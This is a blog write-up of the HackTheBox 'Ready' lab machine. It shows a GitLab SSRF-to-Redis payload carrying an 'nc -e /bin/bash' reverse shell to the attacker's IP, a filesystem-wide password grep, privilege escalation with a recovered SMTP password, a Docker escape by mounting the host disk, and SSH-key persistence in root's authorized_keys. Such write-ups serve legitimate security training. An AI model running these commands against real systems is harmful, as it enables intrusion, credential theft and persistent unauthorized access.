---
layout: post
title: HackTheBox Write-up &mdash; Ready
---

This machine has IP 10.10.10.220.

Let's use `nmap` to enumerate the ports available to us:
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 19:36 NZST
Nmap scan report for 10.10.10.220
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.48 seconds
```

Immediately I see that there is another gitlab server running on port `5080` (as in Laboratory)...but I am still working on that machine too (today I started a bunch of different machines).

I go to `http://ready:5080/` and it asks me to sign in.  I try to make an account but I get a `422` error. 

I found [this](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) exploit after looking up GitLab exploits on Google.  The latter page shows a very cool video on how (for a particular version of GitLab), SSRF (server-side request forgery) can turn into RCE (remote code execution) via Redis.  Apparently it uses a special IPV6 to embed an IPV4 here: `0:0:0:0:0:ffff:127.01.1`

Trying again to make an account, I succeed.  I am now signed in, and I make a new project.  I import project by URL, and see if the following URL works (using the aforementioned IPV6):
```
git://[0:0:0:0:0:ffff:127.0.0.1]:1234/test/ssrf.git
```

Before hitting "create", let's open up Burp Suite and intercept this.  Now, from [here](https://github.com/jas502n/gitlab-SSRF-redis-RCE#burpsuite-request) we find a Burp Suite exploit that involves changing the `import_url` body parameter to 
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/

 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash 10.10.14.239 1234\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

 exec

 exec

/ssrf.git
```

Before sending it, start up netcat:
```bash
nc -nvlp 1234
```

Now send it to repeater and go, and we find that our netcat window has a reverse shell.  Let's do the usual steps of making this shell more stable:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm-colors
```

```bash
$ nc -nvlp 1234
Connection from 10.10.10.220:33452
python3 -c "import pty;pty.spawn('/bin/bash')"
git@gitlab:~/gitlab-rails/working$ export TERM=xterm-colors
export TERM=xterm-colors
git@gitlab:~/gitlab-rails/working$
```

Great.  We are glad this works because we didn't actually have any confirmation that this version is before the 11.4.8 patch.  Let's see where we are in the machine:

```bash
git@gitlab:~/gitlab-rails/working$ pwd
pwd
/var/opt/gitlab/gitlab-rails/working
git@gitlab:~/gitlab-rails/working$ echo $HOME
echo $HOME
/var/opt/gitlab
git@gitlab:~/gitlab-rails/working$ ls /home
ls /home
dude
git@gitlab:~/gitlab-rails/working$ ls /home/dude
ls /home/dude
user.txt
git@gitlab:~/gitlab-rails/working$ cat /home/dude/user.txt
cat /home/dude/user.txt
e1e3************************7682
git@gitlab:~/gitlab-rails/working$ whoami
whoami
git
```

So, despite being the user `git`, we have collected `dude`'s user flag.

We look for a plain-text passowrd:
```bash
find / -type f | while IFS= read -r file; do grep -i password "$file" && echo -e "\u001b[1;38m$file\u001b[0;38m\n\n"; done
```

After a bit of digging, we find a folder `/opt/backup` that contains a plain-text password: `grep -i password /opt/backup/gitlab.rb | grep smtp | awk -F'=' '{print $2}' | sed 's/[[:space:]]*"//g'`.

We can now run `su root` using the aforementioned `smtp_password`, and now we are logged in as root!

But we ls the `/root` directory and don't find anything.  If you will recall, we saw, in the `/opt/backup` directory, a `docker-compose.yml` file.  I think we are inside a docker container, not the actual computer.

To get out of a docket container, I found [this](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1) exploit:
```bash
cd /tmp; mkdir test;  mount /dev/sda2 /tmp/test; cat /tmp/test/root/root.txt
...
b7f9************************c2b3
```

But we haven't actually become root yet (though we are functionally root and have root access to everything).  To do this, we need to create a new `ssh` key on *your* machine, using `ssh-keygen`.  Now copy this (`cat ~/.ssh/id_rsa.pub` | pbcopy`) and, on the host machine, run
```bash
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfa3l1lcRiEwk3/HoXukpmecOH0O8HoAknkB2ux6mwN8L2h88dQdbsfeLBIBxYdJAk8BUxZpuKxbz/sAaY2OgT2Pk4e+z3ah/ldI7NJmFyJBXdeFCBk21p05rpA36ODmidIGVO+PLwLZH1l7DHWvJTkuuRl5HVxID2cE6oJZyVmzKMaTKbqjwGdIpgt6VACCOUmG2gE71d3LFttcKFVo3BB5n9uJdXJfIXGWmyvcgEF8IriZRpZMl1qHGDgPH56uAySZVYwtCStWl8dXTZKX4Uo2VgzGwH36SZ2Oyyw0I+oPfo2IE3uTFrKgujdzvnVzYRI7FiYgFMGhAHIEhkGj5R jakeireland@jake-mbp2017-6917.local' >> /tmp/test/root/.ssh/authorized_keys
```

Now run (from *your* machine)
```bash
ssh -i id_rsa root@10.10.10.220
```

Now you are in!
```bash
root@ready:~# cat /root/root.txt
b7f9************************c2b3
```

